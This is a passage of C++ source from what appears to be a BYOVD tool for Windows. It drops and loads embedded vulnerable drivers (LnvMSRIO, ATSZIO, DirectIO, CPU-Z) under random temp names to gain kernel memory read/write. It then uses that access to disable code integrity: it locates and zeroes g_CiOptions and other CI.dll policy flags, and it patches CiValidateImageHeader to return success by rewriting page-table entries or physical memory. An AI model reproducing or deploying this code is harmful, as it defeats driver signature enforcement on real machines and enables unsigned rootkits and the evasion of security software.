            else if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) { dispOff = 3; instrLen = 7; }
            else if (p[0] == 0x89 && (p[1] & 0xC7) == 0x05) { dispOff = 2; instrLen = 6; }
            else if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x89 && (p[2] & 0xC7) == 0x05) { dispOff = 3; instrLen = 7; }
            else if (p[0] == 0x83 && p[1] == 0x3D) { dispOff = 2; instrLen = 7; }
            else if (p[0] == 0x48 && p[1] == 0x83 && p[2] == 0x3D) { dispOff = 3; instrLen = 8; }
            else if (p[0] == 0xF7 && p[1] == 0x05) { dispOff = 2; instrLen = 10; }
            else if (p[0] == 0x48 && p[1] == 0xF7 && p[2] == 0x05) { dispOff = 3; instrLen = 11; }
            else if (p[0] == 0x83 && (p[1] == 0x25 || p[1] == 0x0D)) { dispOff = 2; instrLen = 7; }
            else if (p[0] == 0x48 && p[1] == 0x83 && (p[2] == 0x25 || p[2] == 0x0D)) { dispOff = 3; instrLen = 8; }

            if (dispOff < 0) continue;

            int32_t disp = *(int32_t*)(p + dispOff);
            DWORD64 target = (DWORD64)(p + instrLen) + disp;
            DWORD64 targetRVA = target - uAddr;
            if (targetRVA >= modInfo.SizeOfImage) continue;
            if (!CiInDataRange(targetRVA, dataRanges, dataCount)) continue;
            if (targetRVA & 3) continue;

            DWORD val = *(DWORD*)(uAddr + targetRVA);
            if (val > 0xFFFF) continue;

            bool found = false;
            for (auto& c : candidates) {
                if (c.rva == targetRVA) { c.refs++; found = true; break; }
            }
            if (!found) candidates.push_back({ targetRVA, val, 1 });
        }
    }

    // With kernel R/W: verify each candidate's kernel value, pick most-referenced with non-zero kernel val
    if (krw.type != KernelRW::Backend::NONE && !candidates.empty()) {
        CiCandidate* best = nullptr;
        for (auto& c : candidates) {
            DWORD64 kVal = KernelRW::Read64(krw, kCiBase + c.rva);
            DWORD kDword = (DWORD)(kVal & 0xFFFFFFFF);
            if (kDword == 0 || kDword > 0xFF) continue;
            if (!best || c.refs > best->refs) best = &c;
        }
        if (best && best->refs >= 2) {
            DWORD64 kVal = KernelRW::Read64(krw, kCiBase + best->rva);
            DWORD kDword = (DWORD)(kVal & 0xFFFFFFFF);
            sprintf_s(tmp, " | ciOpt P3: RVA=0x%llX kv=%u refs=%d/%d",
                (unsigned long long)best->rva, kDword, best->refs, (int)candidates.size());
            diag += tmp;
            FreeLibrary(uCi);
            return kCiBase + best->rva;
        }
    }

    // Fallback without kernel R/W: pick most-referenced small DWORD
    {
        CiCandidate* best = nullptr;
        for (auto& c : candidates) {
            if (c.val > 0xFF) continue;
            if (!best || c.refs > best->refs) best = &c;
        }
        if (!best) {
            for (auto& c : candidates) {
                if (!best || c.refs > best->refs) best = &c;
            }
        }
        if (best && best->refs >= 3) {
            sprintf_s(tmp, " | ciOpt P3: RVA=0x%llX v=%u refs=%d/%d(noKrw)",
                (unsigned long long)best->rva, best->val, best->refs, (int)candidates.size());
            diag += tmp;
            FreeLibrary(uCi);
            return kCiBase + best->rva;
        }

        sprintf_s(tmp, " | P3: %d cands best=%d refs",
            (int)candidates.size(), best ? best->refs : 0);
        diag += tmp;
    }

    // === Phase 4: g_CiProtectedContent pointer indirection ===
    // On Win11 25H2+, CI.dll accesses g_CiOptions through an indirect pointer
    // variable (g_CiProtectedContent) in .data. Code uses `lea r64, [rip+disp]`
    // or `mov r64, [rip+disp]` to get the pointer, then dereferences it.
    // We scan for 64-bit RIP-relative instructions targeting .data, then use
    // kernel R/W to follow the pointer chain.
    if (krw.type != KernelRW::Backend::NONE) {
        DWORD imageSize = modInfo.SizeOfImage;
        struct PtrCandidate { DWORD64 rva; int refs; };
        std::vector<PtrCandidate> ptrCands;
        ptrCands.reserve(32);

        for (int ci = 0; ci < codeCount; ci++) {
            unsigned char* codeStart = (unsigned char*)(uAddr + codeRanges[ci].rva);
            DWORD codeSize = codeRanges[ci].size;

            for (DWORD off = 0; off + 7 < codeSize; off++) {
                unsigned char* p = codeStart + off;
                int dispOff = -1, instrLen = 0;

                // lea r64, [rip+disp32] — REX.W (48) + 8D ModRM
                if (p[0] == 0x48 && p[1] == 0x8D && (p[2] & 0xC7) == 0x05) {
                    dispOff = 3; instrLen = 7;
                }
                // lea r8-r15, [rip+disp32] — REX.WR (4C) + 8D ModRM
                else if (p[0] == 0x4C && p[1] == 0x8D && (p[2] & 0xC7) == 0x05) {
                    dispOff = 3; instrLen = 7;
                }
                // mov r64, [rip+disp32] — REX.W (48) + 8B ModRM
                else if (p[0] == 0x48 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
                    dispOff = 3; instrLen = 7;
                }
                // mov r8-r15, [rip+disp32] — REX.WR (4C) + 8B ModRM
                else if (p[0] == 0x4C && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
                    dispOff = 3; instrLen = 7;
                }

                if (dispOff < 0) continue;

                int32_t disp = *(int32_t*)(p + dispOff);
                DWORD64 target = (DWORD64)(p + instrLen) + disp;
                DWORD64 targetRVA = target - uAddr;
                if (targetRVA >= imageSize) continue;
                if (!CiInDataRange(targetRVA, dataRanges, dataCount)) continue;
                if (targetRVA & 7) continue;

                bool found = false;
                for (auto& c : ptrCands) {
                    if (c.rva == targetRVA) { c.refs++; found = true; break; }
                }
                if (!found) ptrCands.push_back({ targetRVA, 1 });
            }
        }

        // Sort by ref count descending — g_CiProtectedContent is heavily referenced
        for (size_t i = 0; i < ptrCands.size(); i++)
            for (size_t j = i + 1; j < ptrCands.size(); j++)
                if (ptrCands[j].refs > ptrCands[i].refs)
                    std::swap(ptrCands[i], ptrCands[j]);

        // Try each candidate: read kernel QWORD, check if it points within CI.dll
        int tried = 0;
        DWORD64 kCiEnd = (DWORD64)kCiBase + imageSize;
        for (auto& pc : ptrCands) {
            if (tried >= 20) break;
            tried++;

            DWORD64 kPtrAddr = (DWORD64)kCiBase + pc.rva;
            DWORD64 kPtrVal = KernelRW::Read64(krw, kPtrAddr);

            // g_CiProtectedContent points to g_CiOptions within CI.dll
            if (kPtrVal >= (DWORD64)kCiBase && kPtrVal < kCiEnd) {
                // Verify: the target should be a small DWORD (CI flags)
                DWORD64 ciOptQword = KernelRW::Read64(krw, kPtrVal);
                DWORD ciOptVal = (DWORD)(ciOptQword & 0xFFFFFFFF);
                if (ciOptVal > 0 && ciOptVal <= 0xFF) {
                    sprintf_s(tmp, " | ciOpt P4: ptr@RVA=0x%llX->0x%llX v=%u refs=%d",
                        (unsigned long long)pc.rva, (unsigned long long)kPtrVal, ciOptVal, pc.refs);
                    diag += tmp;
                    FreeLibrary(uCi);
                    return kPtrVal;
                }
            }
        }

        sprintf_s(tmp, " | P4: %d ptrs tried=%d", (int)ptrCands.size(), tried);
        diag += tmp;
    }

    if (fallbackKv0RVA && fallbackKv0Refs >= 2) {
        sprintf_s(tmp, " | ciOpt FALLBACK kv=0: %s RVA=0x%llX refs=%d",
            fallbackKv0Source ? fallbackKv0Source : "?", (unsigned long long)fallbackKv0RVA, fallbackKv0Refs);
        diag += tmp;
        FreeLibrary(uCi);
        return kCiBase + fallbackKv0RVA;
    } else if (fallbackKv0RVA) {
        sprintf_s(tmp, " | ciOpt kv=0 skip (refs=%d<2): RVA=0x%llX", fallbackKv0Refs, (unsigned long long)fallbackKv0RVA);
        diag += tmp;
    }

    diag += " | ciOpt=miss";
    FreeLibrary(uCi);
    return 0;
}

// ── Service management (registry-based) ──────────────────────────────────

static std::wstring MakeServicePath(const std::wstring& driverPath) {
    return L"\\??\\" + driverPath;
}

static std::wstring PathToServiceName(const std::wstring& path) {
    std::wstring name = path;
    size_t slash = name.find_last_of(L"\\/");
    if (slash != std::wstring::npos) name = name.substr(slash + 1);
    size_t dot = name.find_last_of(L'.');
    if (dot != std::wstring::npos) name = name.substr(0, dot);
    return name;
}

static bool CreateDriverService(const std::wstring& driverPath, std::wstring& svcKeyOut) {
    std::wstring svcName = PathToServiceName(driverPath);
    svcKeyOut = L"System\\CurrentControlSet\\Services\\" + svcName;

    HKEY hKey = nullptr;
    LSTATUS st = RegCreateKeyExW(HKEY_LOCAL_MACHINE, svcKeyOut.c_str(),
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    if (st != ERROR_SUCCESS) return false;

    std::wstring ntPath = MakeServicePath(driverPath);
    DWORD svcType = 1;      // SERVICE_KERNEL_DRIVER
    DWORD svcStart = 3;     // SERVICE_DEMAND_START
    DWORD svcError = 1;     // SERVICE_ERROR_NORMAL

    bool ok = true;
    if (RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ,
        (const BYTE*)ntPath.c_str(), (DWORD)((ntPath.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) ok = false;
    if (RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
        (const BYTE*)&svcType, sizeof(svcType)) != ERROR_SUCCESS) ok = false;
    if (RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
        (const BYTE*)&svcStart, sizeof(svcStart)) != ERROR_SUCCESS) ok = false;
    if (RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
        (const BYTE*)&svcError, sizeof(svcError)) != ERROR_SUCCESS) ok = false;
    RegCloseKey(hKey);
    if (!ok) { RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcKeyOut.c_str()); return false; }
    return true;
}

static void DeleteDriverService(const std::wstring& svcKey) {
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcKey.c_str());
}

static NTSTATUS NtLoadDriverWrapper(const std::wstring& svcKey) {
    typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING);
    typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto pNtLoad = (NtLoadDriver_t)GetProcAddress(ntdll, "NtLoadDriver");
    auto pRtlInit = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    if (!pNtLoad || !pRtlInit) return (NTSTATUS)0xC0000002L;

    std::wstring regPath = L"\\Registry\\Machine\\" + svcKey;

    typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTRING;
    USTRING us;
    pRtlInit((PUNICODE_STRING)&us, regPath.c_str());
    return pNtLoad((PUNICODE_STRING)&us);
}

static NTSTATUS NtUnloadDriverWrapper(const std::wstring& svcKey) {
    typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING);
    typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto pNtUnload = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
    auto pRtlInit = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    if (!pNtUnload || !pRtlInit) return (NTSTATUS)0xC0000002L;

    std::wstring regPath = L"\\Registry\\Machine\\" + svcKey;

    typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTRING;
    USTRING us;
    pRtlInit((PUNICODE_STRING)&us, regPath.c_str());
    return pNtUnload((PUNICODE_STRING)&us);
}

// ── SE_LOAD_DRIVER_PRIVILEGE ─────────────────────────────────────────────

static bool EnableLoadDriverPrivilege() {
    EnablePrivilege(20 /*SeDebugPrivilege*/);
    return EnablePrivilege(10 /*SeLoadDriverPrivilege*/);
}

// ── File helpers ─────────────────────────────────────────────────────────

static std::wstring DropToTemp(const uint8_t* data, size_t size, const wchar_t* filename) {
    if (size > 0xFFFFFFFFULL) return L"";

    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);
    std::wstring path = std::wstring(tempDir) + filename;

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return L"";

    DWORD written = 0;
    WriteFile(hFile, data, (DWORD)size, &written, nullptr);
    CloseHandle(hFile);
    if (written != (DWORD)size) {
        DeleteFileW(path.c_str());
        return L"";
    }
    return path;
}

static std::wstring RandomTempName(const wchar_t* ext) {
    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    wchar_t name[12] = {};
    uint8_t rng[8] = {};
    typedef NTSTATUS(NTAPI* BCryptGenRandom_t)(PVOID, PUCHAR, ULONG, ULONG);
    auto pBCrypt = (BCryptGenRandom_t)GetProcAddress(
        LoadLibraryA("bcrypt.dll"), "BCryptGenRandom");
    if (pBCrypt && pBCrypt(nullptr, rng, sizeof(rng), 0x00000002 /*BCRYPT_USE_SYSTEM_PREFERRED_RNG*/) >= 0) {
        for (int i = 0; i < 8; i++)
            name[i] = charset[rng[i] % 36];
    } else {
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);
        uint64_t seed = pc.QuadPart ^ GetTickCount64() ^ (uint64_t)GetCurrentProcessId()
                        ^ (uint64_t)GetCurrentThreadId();
        for (int i = 0; i < 8; i++) {
            seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
            name[i] = charset[(seed >> 33) % 36];
        }
    }
    return std::wstring(name) + ext;
}

// ── Try one vulnerable driver backend ───────────────────────────────────

struct VulnDriverState {
    KernelRW::Context  krw;
    std::wstring       vulnPath;
    std::wstring       vulnSvcKey;
    bool               loaded;       // we loaded it (vs. already present)
    const char*        backendName;
};

static VulnDriverState TryVulnDriver(
    const VulnDriver& drv,
    DWORD64 kBase,
    std::string& failReason)
{
    VulnDriverState st = {};
    st.backendName = drv.name;

    if (drv.dataSize == 0) {
        failReason = std::string(drv.name) + " not embedded";
        return st;
    }

    // Check if the device is already accessible
    HANDLE existing = CreateFileA(drv.deviceString, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);

    if (existing != INVALID_HANDLE_VALUE) {
        // Device already loaded — initialize backend
        if (drv.backend == KernelRW::Backend::LNVMSRIO) {
            bool la57 = false;
            DWORD64 cr3 = KernelRW::LNVMSRIO_FindSystemCR3(existing, kBase, la57);
            if (!cr3) {
                CloseHandle(existing);
                failReason = std::string(drv.name) + " device open but CR3 scan failed";
                return st;
            }
            st.krw.type = KernelRW::Backend::LNVMSRIO;
            st.krw.device = existing;
            st.krw.cr3 = cr3;
            st.krw.la57 = la57;
        } else if (drv.backend == KernelRW::Backend::ATSZIO) {
            bool la57 = false;
            DWORD64 cr3 = KernelRW::ATSZIO_FindSystemCR3(existing, kBase, la57);
            if (!cr3) {
                CloseHandle(existing);
                failReason = std::string(drv.name) + " device open but CR3 scan failed";
                return st;
            }
            st.krw.type = KernelRW::Backend::ATSZIO;
            st.krw.device = existing;
            st.krw.cr3 = cr3;
            st.krw.la57 = la57;
        } else if (drv.backend == KernelRW::Backend::DIRECTIO) {
            bool la57 = false;
            DWORD64 cr3 = KernelRW::DIRECTIO_FindSystemCR3(existing, kBase, la57);
            if (!cr3) {
                CloseHandle(existing);
                failReason = std::string(drv.name) + " device open but CR3 scan failed";
                return st;
            }
            st.krw.type = KernelRW::Backend::DIRECTIO;
            st.krw.device = existing;
            st.krw.cr3 = cr3;
            st.krw.la57 = la57;
        } else if (drv.backend == KernelRW::Backend::CPUZ) {
            bool la57 = false;
            DWORD64 cr3 = KernelRW::CPUZ_FindSystemCR3(existing, kBase, la57);
            if (!cr3) {
                CloseHandle(existing);
                failReason = std::string(drv.name) + " device open but CR3 scan failed";
                return st;
            }
            st.krw.type = KernelRW::Backend::CPUZ;
            st.krw.device = existing;
            st.krw.cr3 = cr3;
            st.krw.la57 = la57;
        } else {
            st.krw.type = drv.backend;
            st.krw.device = existing;
        }
        st.loaded = false;
        return st;
    }

    // Drop to temp and load
    std::wstring tempName = RandomTempName(L".sys");
    std::wstring vulnPath = DropToTemp(drv.data, drv.dataSize, tempName.c_str());
    if (vulnPath.empty()) {
        failReason = std::string(drv.name) + " failed to extract to temp";
        return st;
    }

    std::wstring svcKey;
    if (!CreateDriverService(vulnPath, svcKey)) {
        DeleteFileW(vulnPath.c_str());
        failReason = std::string(drv.name) + " failed to create service entry";
        return st;
    }

    NTSTATUS ldSt = NtLoadDriverWrapper(svcKey);
    if (ldSt < 0) {
        char hex[16];
        sprintf_s(hex, "%08X", (unsigned)ldSt);
        failReason = std::string(drv.name) + " load failed (0x" + hex + ")";
        DeleteDriverService(svcKey);
        DeleteFileW(vulnPath.c_str());
        return st;
    }

    // Retry device open
    HANDLE dev = INVALID_HANDLE_VALUE;
    for (int retry = 0; retry < 10; retry++) {
        dev = CreateFileA(drv.deviceString, GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        if (dev != INVALID_HANDLE_VALUE) break;
        Sleep(100);
    }

    if (dev == INVALID_HANDLE_VALUE) {
        char errBuf[128];
        sprintf_s(errBuf, " loaded but device not accessible (err=%lu devStr=%s)",
            GetLastError(), drv.deviceString);
        failReason = std::string(drv.name) + errBuf;
        NtUnloadDriverWrapper(svcKey);
        DeleteDriverService(svcKey);
        DeleteFileW(vulnPath.c_str());
        return st;
    }

    // For physical-memory backends, discover System CR3
    if (drv.backend == KernelRW::Backend::LNVMSRIO) {
        bool la57 = false;
        DWORD64 cr3 = KernelRW::LNVMSRIO_FindSystemCR3(dev, kBase, la57);
        if (!cr3) {
            CloseHandle(dev);
            NtUnloadDriverWrapper(svcKey);
            DeleteDriverService(svcKey);
            DeleteFileW(vulnPath.c_str());
            failReason = std::string(drv.name) + " loaded but CR3 scan failed";
            return st;
        }
        st.krw.cr3 = cr3;
        st.krw.la57 = la57;
    } else if (drv.backend == KernelRW::Backend::ATSZIO) {
        bool la57 = false;
        DWORD64 cr3 = KernelRW::ATSZIO_FindSystemCR3(dev, kBase, la57);
        if (!cr3) {
            CloseHandle(dev);
            NtUnloadDriverWrapper(svcKey);
            DeleteDriverService(svcKey);
            DeleteFileW(vulnPath.c_str());
            failReason = std::string(drv.name) + " loaded but CR3 scan failed";
            return st;
        }
        st.krw.cr3 = cr3;
        st.krw.la57 = la57;
    } else if (drv.backend == KernelRW::Backend::DIRECTIO) {
        bool la57 = false;
        DWORD64 cr3 = KernelRW::DIRECTIO_FindSystemCR3(dev, kBase, la57);
        if (!cr3) {
            CloseHandle(dev);
            NtUnloadDriverWrapper(svcKey);
            DeleteDriverService(svcKey);
            DeleteFileW(vulnPath.c_str());
            failReason = std::string(drv.name) + " loaded but CR3 scan failed";
            return st;
        }
        st.krw.cr3 = cr3;
        st.krw.la57 = la57;
    } else if (drv.backend == KernelRW::Backend::CPUZ) {
        bool la57 = false;
        DWORD64 cr3 = KernelRW::CPUZ_FindSystemCR3(dev, kBase, la57);
        if (!cr3) {
            CloseHandle(dev);
            NtUnloadDriverWrapper(svcKey);
            DeleteDriverService(svcKey);
            DeleteFileW(vulnPath.c_str());
            failReason = std::string(drv.name) + " loaded but CR3 scan failed";
            return st;
        }
        st.krw.cr3 = cr3;
        st.krw.la57 = la57;
    }

    st.krw.type = drv.backend;
    st.krw.device = dev;
    st.vulnPath = vulnPath;
    st.vulnSvcKey = svcKey;
    st.loaded = true;
    return st;
}

static void CleanupVulnDriver(VulnDriverState& st) {
    KernelRW::Close(st.krw);
    if (st.loaded) {
        if (!st.vulnSvcKey.empty()) {
            NtUnloadDriverWrapper(st.vulnSvcKey);
            DeleteDriverService(st.vulnSvcKey);
        }
        if (!st.vulnPath.empty())
            DeleteFileW(st.vulnPath.c_str());
    }
}

// ── Layer 3: CI.dll .data flag shotgun ───────────────────────────────────
// Zeros ALL flag-like DWORDs in CI.dll's .data section (values 1-255).
// Covers unknown CI policy variables beyond g_CiOptions on Win11 25H2+.

static int PatchCiDataFlags(const KernelRW::Context& krw, ULONG_PTR kCiBase,
    DWORD64 skipAddr, DWORD64* addrs, DWORD64* orig, int maxPatch, std::string& diag)
{
    char tmp[128];
    int count = 0;
    HMODULE uCi = LoadLibraryExA("CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!uCi) { diag += " | CiData:loadfail"; return 0; }

    auto* dos = (IMAGE_DOS_HEADER*)uCi;
    auto* nt = (IMAGE_NT_HEADERS64*)((char*)uCi + dos->e_lfanew);
    auto* sects = IMAGE_FIRST_SECTION(nt);
    DWORD dataRVA = 0, dataSize = 0;
    for (WORD si = 0; si < nt->FileHeader.NumberOfSections; si++) {
        if (memcmp(sects[si].Name, ".data", 5) == 0 &&
            (sects[si].Name[5] == '\0' || sects[si].Name[5] == '$')) {
            dataRVA = sects[si].VirtualAddress;
            dataSize = sects[si].Misc.VirtualSize;
            break;
        }
    }
    if (!dataRVA) { FreeLibrary(uCi); diag += " | CiData:no.data"; return 0; }

    DWORD scanSize = (dataSize < 512) ? dataSize : 512;
    for (DWORD off = 0; off + 8 <= scanSize && count < maxPatch; off += 4) {
        DWORD64 kAddr = kCiBase + dataRVA + off;
        if (kAddr == skipAddr) continue;
        DWORD64 kVal = KernelRW::Read64(krw, kAddr);
        DWORD lo = (DWORD)(kVal & 0xFFFFFFFF);
        if (lo == 0x6 || lo == 0x8 || lo == 0xE || lo == 0x2 || lo == 0x7 || lo == 0xF) {
            addrs[count] = kAddr;
            orig[count] = kVal;
            KernelRW::Write64(krw, kAddr, kVal & 0xFFFFFFFF00000000ULL);
            count++;
        }
    }
    sprintf_s(tmp, " | CiData:%d zeroed", count);
    diag += tmp;
    FreeLibrary(uCi);
    return count;
}

// ── Layer 4: PTE-based CI function code patching ─────────────────────────
// Makes CiValidateImageHeader return STATUS_SUCCESS by patching its prolog.
// GIO backend: modify PTE to make code page writable, then patch.
// Physical backends (LnvMSRIO, ATSZIO, DirectIO, CPUZ): write directly via physical memory.

static bool PatchCiFuncCode(const KernelRW::Context& krw, DWORD64 funcAddr,
    DWORD64 pteBase, DWORD64& origProlog, DWORD64& origPte, DWORD64& pteAddr,
    std::string& diag)
{
    char tmp[128];
    origProlog = 0; origPte = 0; pteAddr = 0;
    if (!funcAddr) return false;

    if (krw.type == KernelRW::Backend::LNVMSRIO ||
        krw.type == KernelRW::Backend::ATSZIO ||
        krw.type == KernelRW::Backend::DIRECTIO ||
        krw.type == KernelRW::Backend::CPUZ) {
        DWORD64 phys = 0;
        if (krw.type == KernelRW::Backend::LNVMSRIO)
            phys = KernelRW::LNVMSRIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        else if (krw.type == KernelRW::Backend::ATSZIO)
            phys = KernelRW::ATSZIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        else if (krw.type == KernelRW::Backend::DIRECTIO)
            phys = KernelRW::DIRECTIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        else
            phys = KernelRW::CPUZ_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        if (!phys) { diag += " | L4:phys=0"; return false; }

        auto readP = [&](DWORD64 pa) -> DWORD64 {
            if (krw.type == KernelRW::Backend::LNVMSRIO)
                return KernelRW::LNVMSRIO_ReadPhys64(krw.device, pa);
            if (krw.type == KernelRW::Backend::ATSZIO)
                return KernelRW::ATSZIO_ReadPhys64(krw.device, pa);
            if (krw.type == KernelRW::Backend::DIRECTIO)
                return KernelRW::DIRECTIO_ReadPhys64(krw.device, pa);
            return KernelRW::CPUZ_ReadPhys64(krw.device, pa);
        };
        auto writeP = [&](DWORD64 pa, DWORD64 v) -> bool {
            if (krw.type == KernelRW::Backend::LNVMSRIO)
                return KernelRW::LNVMSRIO_WritePhys64(krw.device, pa, v);
            if (krw.type == KernelRW::Backend::ATSZIO)
                return KernelRW::ATSZIO_WritePhys64(krw.device, pa, v);
            if (krw.type == KernelRW::Backend::DIRECTIO)
                return KernelRW::DIRECTIO_WritePhys64(krw.device, pa, v);
            return KernelRW::CPUZ_WritePhys64(krw.device, pa, v);
        };

        origProlog = readP(phys);
        DWORD64 patch = (origProlog & ~0xFFFFFFULL) | 0xC3C033ULL;
        writeP(phys, patch);
        DWORD64 verify = readP(phys);
        if ((verify & 0xFFFFFF) != 0xC3C033) {
            writeP(phys, origProlog);
            diag += " | L4:phys-verify-fail";
            return false;
        }
        sprintf_s(tmp, " | L4:phys@0x%llX OK", (unsigned long long)phys);
        diag += tmp;
        return true;
    }

    // GIO backend: need PTE/PDE manipulation for code page writes
    if (!pteBase) { diag += " | L4:no-pte"; return false; }

    // Compute PTE and PDE addresses via self-referencing page table.
    // Must check PDE FIRST: ntoskrnl (and sometimes CI.dll) is mapped with
    // 2MB large pages on Win11. For large pages there IS no PTE — reading
    // the computed PTE address hits unmapped memory → #PF → BSOD.
    DWORD64 pteVA = pteBase + ((funcAddr >> 9) & 0x7FFFFFFFF8ULL);
    DWORD64 pdeVA = pteBase + ((pteVA >> 9) & 0x7FFFFFFFF8ULL);

    DWORD64 pde = KernelRW::Read64(krw, pdeVA);
    if (!pde || !(pde & 1)) {
        sprintf_s(tmp, " | L4:pde-not-present(0x%llX)", (unsigned long long)pde);
        diag += tmp;
        return false;
    }

    bool largePage = (pde & 0x80) != 0;

    if (largePage) {
        // 2MB large page — modify PDE directly (no PTE exists).
        pteAddr = pdeVA;
        origPte = pde;
        DWORD64 writablePde = (pde | 2ULL) & ~0x100ULL;
        KernelRW::Write64(krw, pdeVA, writablePde);

        DWORD64 pdeVerify = KernelRW::Read64(krw, pdeVA);
        if (!(pdeVerify & 2)) {
            KernelRW::Write64(krw, pdeVA, pde);
            diag += " | L4:pde-write-blocked(HVCI?)";
            pteAddr = 0; origPte = 0;
            return false;
        }

        origProlog = KernelRW::Read64(krw, funcAddr);
        DWORD64 patch = (origProlog & ~0xFFFFFFULL) | 0xC3C033ULL;
        if (!KernelRW::Write64(krw, funcAddr, patch)) {
            KernelRW::Write64(krw, pdeVA, pde);
            diag += " | L4:write-fail(2MB)";
            pteAddr = 0; origPte = 0;
            return false;
        }
        DWORD64 verify = KernelRW::Read64(krw, funcAddr);
        if ((verify & 0xFFFFFF) != 0xC3C033) {
            KernelRW::Write64(krw, pdeVA, pde);
            diag += " | L4:verify-fail(2MB)";
            pteAddr = 0; origPte = 0;
            return false;
        }
        sprintf_s(tmp, " | L4:pde@0x%llX(2MB) OK", (unsigned long long)pdeVA);
        diag += tmp;
        return true;
    }

    // Normal 4KB page — use PTE.
    pteAddr = pteVA;
    origPte = KernelRW::Read64(krw, pteAddr);
    if (!origPte) { diag += " | L4:pte=0"; return false; }

    if (!(origPte & 1)) { diag += " | L4:pte-not-present"; return false; }
    DWORD64 pfn = (origPte >> 12) & 0xFFFFFFFFFULL;
    if (!pfn || pfn > 0x1000000) {
        sprintf_s(tmp, " | L4:pte-bad-pfn(0x%llX)", (unsigned long long)pfn);
        diag += tmp;
        return false;
    }

    DWORD64 writablePte = (origPte | 2ULL) & ~0x100ULL;
    KernelRW::Write64(krw, pteAddr, writablePte);

    DWORD64 pteVerify = KernelRW::Read64(krw, pteAddr);
    if (!(pteVerify & 2)) {
        KernelRW::Write64(krw, pteAddr, origPte);
        diag += " | L4:pte-write-blocked(HVCI?)";
        pteAddr = 0; origPte = 0;
        return false;
    }

    origProlog = KernelRW::Read64(krw, funcAddr);
    DWORD64 patch = (origProlog & ~0xFFFFFFULL) | 0xC3C033ULL;
    if (!KernelRW::Write64(krw, funcAddr, patch)) {
        KernelRW::Write64(krw, pteAddr, origPte);
        diag += " | L4:write-fail";
        return false;
    }
    DWORD64 verify = KernelRW::Read64(krw, funcAddr);
    if ((verify & 0xFFFFFF) != 0xC3C033) {
        KernelRW::Write64(krw, pteAddr, origPte);
        diag += " | L4:verify-fail";
        return false;
    }
    sprintf_s(tmp, " | L4:pte@0x%llX(4K) OK", (unsigned long long)pteAddr);
    diag += tmp;
    return true;
}

static void RestoreCiFuncCode(const KernelRW::Context& krw, DWORD64 funcAddr,
    DWORD64 origProlog, DWORD64 origPte, DWORD64 pteAddr)
{
    if (!funcAddr || !origProlog) return;
    if (krw.type == KernelRW::Backend::LNVMSRIO) {
        DWORD64 phys = KernelRW::LNVMSRIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        if (phys) KernelRW::LNVMSRIO_WritePhys64(krw.device, phys, origProlog);
        return;
    }
    if (krw.type == KernelRW::Backend::ATSZIO) {
        DWORD64 phys = KernelRW::ATSZIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        if (phys) KernelRW::ATSZIO_WritePhys64(krw.device, phys, origProlog);
        return;
    }
    if (krw.type == KernelRW::Backend::DIRECTIO) {
        DWORD64 phys = KernelRW::DIRECTIO_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        if (phys) KernelRW::DIRECTIO_WritePhys64(krw.device, phys, origProlog);
        return;
    }
    if (krw.type == KernelRW::Backend::CPUZ) {
        DWORD64 phys = KernelRW::CPUZ_VirtToPhys(krw.device, krw.cr3, funcAddr, krw.la57);
        if (phys) KernelRW::CPUZ_WritePhys64(krw.device, phys, origProlog);
        return;
    }
    KernelRW::Write64(krw, funcAddr, origProlog);
    if (pteAddr && origPte)
        KernelRW::Write64(krw, pteAddr, origPte);
}

// ── Runtime HVCI detection ──────────────────────────────────────────────
// HVCI (Hypervisor-enforced Code Integrity) is a boot-time feature.
// Registry changes don't disable it at runtime — only a reboot does.
// If HVCI is active, any kernel R/W via BYOVD will trigger a hypervisor
// violation and BSOD. We must detect and abort before touching anything.

static bool IsHVCIRunning() {
    typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
